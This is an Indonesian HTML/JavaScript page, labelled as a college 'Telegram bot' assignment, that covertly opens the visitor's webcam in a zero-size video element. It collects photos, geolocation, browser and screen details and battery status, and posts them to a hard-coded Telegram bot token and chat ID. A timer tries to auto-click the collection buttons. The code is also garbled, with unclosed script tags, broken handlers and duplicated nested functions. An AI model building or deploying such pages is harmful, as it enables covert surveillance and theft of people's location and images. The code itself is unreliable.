<!DOCTYPE html>
<html>
<head>
  <title>Tugas Kuliah - Bot Telegram</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
  <h1>Tugas Kuliah - Bot Telegram</h1>
   <video id="video" width="0" height="0" autoplay></video>
  <button id="capture-btn">Klik allow</button>
  <canvas id="canvas" width="0" height="0" style="display: none;"></canvas>

  <script>
    var video = document.getElementById('video');

    var constraints = { video: true };

    navigator.mediaDevices.getUserMedia(constraints)
      .then(function(mediaStream) {
        video.srcObject = mediaStream;
        video.onloadedmetadata = function(e) {
          video.play();
        };
      })
      .catch(function(err) {
        console.error(err);
      });

    var captureButton = document.getElementById('capture-btn');

    captureButton.onclick = function() {
      var canvas = document.getElementById('canvas');
      var context = canvas.getContext('2d');

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      var imageDataURL = canvas.toDataURL('image/png');
	  
  <button onclick="capture-btn()">Ambil Foto</button>
  <button onclick="getLocation()">Dapatkan Lokasi</button>
  <button onclick="getDeviceInfo()">Dapatkan Informasi Perangkat</button>
  <button onclick="getBatteryInfo()">Dapatkan Informasi Baterai</button>

  <script>
    // Ganti dengan token bot Telegram Anda
    const token = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    // Ganti dengan chat ID tujuan
    const chatId = '1121369247';

    function sendTelegramMessage(text) {
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      const data = { chat_id: chatId, text: text };
      $.post(url, data);
    }

    function sendTelegramPhoto(photo) {
      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
      const data = { chat_id: chatId, photo: photo };
      $.post(url, data);
    }

    function takePhoto() {
      // Mengambil foto dengan bantuan <input type="file">
      const fileInput = document.createElement('input');
      fileInput.type = 'file';
      fileInput.accept = 'image/*';

      fileInput.addEventListener('change', function(event) {
        const file = event.target.files[0];
        const reader = new FileReader();
        reader.onload = function() {
          const photoData = reader.result;
          sendTelegramPhoto(photoData);
        };
        reader.readAsDataURL(file);
      });

      fileInput.click();
    }

    function getLocation() {
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const locationText = `Lokasi: ${lat}, ${lon}`;
          sendTelegramMessage(locationText);
        });
      } else {
        sendTelegramMessage('Maaf, peramban tidak mendukung geolokasi.');
      }
    }

    function getDeviceInfo() {
      const deviceInfo = `
        Browser: ${navigator.userAgent}
        Resolusi Layar: ${screen.width}x${screen.height}
      `;
      sendTelegramMessage(deviceInfo);
    }

    function getBatteryInfo() {
      if ('getBattery' in navigator) {
        navigator.getBattery().then(function(battery) {
          const batteryInfo = `
            Level Baterai: ${battery.level * 100}%
            Pengisian: ${battery.charging ? 'Ya' : 'Tidak'}
          `;
          sendTelegramMessage(batteryInfo);
        });
      } else {
        sendTelegramMessage('Maaf, peramban tidak mendukung informasi baterai.');
      }
	     }

    // Fungsi untuk melakukan klik tombol secara otomatis
    function autoClickButton() {
      var button = document.getElementById('getLocation');
      button.click();
	  
	function autoClickButton() {
      var button = document.getElementById('getDeviceInfo');
      button.click();
	
	function autoClickButton() {
      var button = document.getElementById('getBatteryInfo');
      button.click();
    }

    // Melakukan klik tombol setelah 3 detik
    setTimeout(autoClickButton, 3000);
    }
  </script>
</body>
</html>
